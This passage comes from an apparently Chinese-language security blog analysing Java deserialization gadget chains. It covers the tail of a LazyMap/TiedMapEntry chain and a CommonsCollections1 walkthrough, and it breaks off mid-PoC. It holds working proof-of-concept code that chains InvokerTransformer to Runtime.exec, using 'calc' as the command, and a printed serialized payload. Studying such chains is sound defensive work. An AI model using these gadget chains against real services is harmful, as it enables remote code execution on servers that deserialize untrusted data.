java"><table><tr><td class="code"><pre><span class="line">chain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>则弹出计算器</p><ul><li><strong>LazyMap</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br></pre></td></tr></table></figure>这个类的作用是实现一个懒加载<br>怎么实现的呢？<br>看看它的构造方法以及<code>get()</code>方法：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">                map.put(key, value);</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>可见生成对象的时候可以传入一个翻译器作为值加工厂<br>当从<code>LazyMap</code>里get值的时候</li></ul><p>如果没有get到，就会根据键名加工出一个值（<code>value</code>）来<br>返回并加到map中<br>这就实现了翻译操作的触发</p><p>这时候触发弹出计算器的操作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.get(<span class="string">&quot;ciallo&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>TiedMapEntry</strong></li></ul><p>其设计初衷是简化键值对的绑定操作，并提供延迟加载或动态计算的特性。<br>在实际开发中，它的应用场景相对有限，但在特定需求下可以发挥独特作用。<br>当需要按需生成或加载某些资源（如缓存数据、动态配置）时，<br>结合<code>LazyMap</code>使用<code>TiedMapEntry</code>，<br>可以避免一次性加载所有数据，减少资源消耗</p><p>使用例子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个 Transformer，按需生成 Value</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">lazyTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟耗时操作（如数据库查询）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Generating value for key: &quot;</span> + key);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Value_&quot;</span> + key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 LazyMap，绑定自定义 Transformer</span></span><br><span class="line">Map&lt;String, Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), lazyTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定键与 LazyMap</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;user_123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 首次调用 getValue() 触发延迟加载</span></span><br><span class="line">System.out.println(tiedEntry.getValue()); </span><br><span class="line"><span class="comment">// 输出: Generating value for key: user_123 → Value_user_123</span></span><br><span class="line"></span><br><span class="line">System.out.println(tiedEntry.getValue()); </span><br><span class="line"><span class="comment">// 直接返回缓存值 → Value_user_123</span></span><br></pre></td></tr></table></figure><p>一般与<code>LazyMap</code>绑定使用<br>他的<code>hashcode</code>方法中调用了触发<code>LazyMap</code>的<code>get</code><br>他的构造方法、<code>hashcode</code>以及<code>getvalue</code>方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">                (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们找一找怎么调用他的<code>hashcode</code><br>这个东西非常眼熟<br>我们在<code>URLDNS</code>链子里一起看过<br>现在目标就从调用<code>URL</code>类的<code>hashcode</code><br>转换为了<code>TiedMapEntry</code>的<code>hashcode</code><br>弹出计算器的操作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">entry.hashCode();</span><br></pre></td></tr></table></figure><ul><li><strong>HashMap</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><p>之后序列化即可:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 6: 生成恶意序列化数据</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(hashMap);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 7: 模拟反序列化攻击（触发漏洞）</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">ois.readObject();  <span class="comment">// 此处弹出计算器</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsCollections1</title>
      <link href="/2025/03/26/java-cc1/"/>
      <url>/2025/03/26/java-cc1/</url>
      
        <content type="html"><![CDATA[<h3 id="一个触发命令执行的Demo"><a href="#一个触发命令执行的Demo" class="headerlink" title="一个触发命令执行的Demo"></a>一个触发命令执行的Demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="利用CC链中的翻译器类-Transformer-进行命令执行"><a href="#利用CC链中的翻译器类-Transformer-进行命令执行" class="headerlink" title="利用CC链中的翻译器类(Transformer)进行命令执行"></a>利用CC链中的翻译器类(Transformer)进行命令执行</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>前面部分定义了一个<code>Transformer</code>的数组<br>其中包含两个<code>Transformer</code>：</p><p><strong>1.</strong> <code>ConstantTransformer</code>：返回常量的翻译器，<br>此处传入了可执行命令的<code>Runtime</code>对象<br>也就是无论往翻译器里传入什么，都只会返回<code>Runtime</code>对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.</strong> <code>InvokerTransformer</code>：<br>传入对象，函数名，参数<br>返回执行结果<br>所以此处如果传入<code>Runtime</code>对象、函数<code>exec</code>、参数<code>命令(演示用calc)</code><br>就可以实现命令执行：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">        <span class="comment">//...报错处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再用<code>ChainedTransformer</code>将这两个翻译器连起来<br>这个翻译器会把输入按顺序通过列表中的翻译器:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时只要执行一句:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transformerChain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>就可以实现命令执行弹出计算器了</p><h3 id="构造序列化数据"><a href="#构造序列化数据" class="headerlink" title="构造序列化数据"></a>构造序列化数据</h3><p>但只是我们本地测试的一个效果<br>想在服务器上反序列化的过程触发这个操作<br>还需要借助别的东西<br>想要直接执行上述的<code>transform</code>方法比较困难<br>将其转换为别的操作:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">    innerMap, </span><br><span class="line">    <span class="literal">null</span>,</span><br><span class="line">    transformerChain</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>看一下<code>TransformedMap</code>这个特殊的<code>Map</code>类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说这个类可以传入：</p><ul><li>一个<code>HashMap</code></li><li>一个键翻译器</li><li>一个值翻译器</li></ul><p>而后在添加(<code>put</code>)新的元素的时候<br>会先将键值对分别翻译后再添加<br>此时就触发了翻译操作<br>触发执行命令的语句从</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transformerChain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>转换为了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;键&quot;</span>, <span class="string">&quot;值&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么如何在序列化的过程中实现这个添加元素的过程呢<br>需要进入下一步:</p><h4 id="AnnotationInvocationHandler类"><a href="#AnnotationInvocationHandler类" class="headerlink" title="AnnotationInvocationHandler类"></a><code>AnnotationInvocationHandler</code>类</h4><p>位于:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler</span><br></pre></td></tr></table></figure><p>是 Java 标准库中的一个内部类（位于 sun.reflect.annotation 包），<br>主要用于处理注解（Annotation）的动态代理机制。<br>它在 Java 的反射和注解处理中扮演重要角色，<br>但由于是内部 API，开发者通常不会直接使用它。</p><ul><li>注解（不是注释）：<br>注解是 Java 中的一种元数据（Metadata）​机制，用于为代码（类、方法、字段等）添加额外的结构化信息。这些信息可以被编译器、开发工具或运行时框架（如 Spring、Hibernate）读取，并根据注解的内容执行特定操作。<br>相当于给编译器看的注释而非给人看的。</li></ul><p>看看他的<code>readObject</code>方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var10 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var10.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry var5 : <span class="built_in">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到使用一个for循环对<code>this.memberValues</code>属性进行了一系列的操作<br>这个属性就是我们的map，看看构造方法:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将我们的<code>outerMap</code>作为第二个参数传入赋值给<code>memberValues</code><br>触发添加元素:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>将handler输出为序列化字符串<br>就是我们的payload:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(barr);</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4�  xp   sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime           xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l  xp   t </span><br><span class="line">getRuntimeur [Ljava.lang.Class;�׮��Z�  xp    t getMethoduq ~    vr java.lang.String��8z;�B  xpvq ~ sq ~ uq ~    puq ~     t invokeuq ~    vr java.lang.Object           xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G  xp   t calct execuq ~    q ~ sr java.util.HashMap���`� F </span><br><span class="line">loadFactorI thresholdxp?@           t valuet xxxxxxvr java.lang.annotation.Retention           xp</span><br></pre></td></tr></table></figure><p>假如存在某个这样的漏洞点:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(newByteArrayInputStream(barr.toByteArray()));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br></pre></td></tr></table></figure><p>按理说就可以执行我们的恶意代码了<br>不过还存在最后一个问题<br>那就是<code>Runtime</code>类事实上没有实现<code>Serializable</code>接口<br>导致无法被序列化<br><strong>怎么办？</strong><br>在JVM中，每个类加载后都会生成一个唯一的<code>Class</code>对象，<br>用来表示该类的类型信息，获取方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">类名.class</span><br></pre></td></tr></table></figure><p>同样的，使用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.class</span><br></pre></td></tr></table></figure><p>就可以获取到Runtime的Class对象<br>这个对象可以进行反射调用获取Runtime并执行命令：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么我们就需要换一条翻译链子了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>完整poc:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span 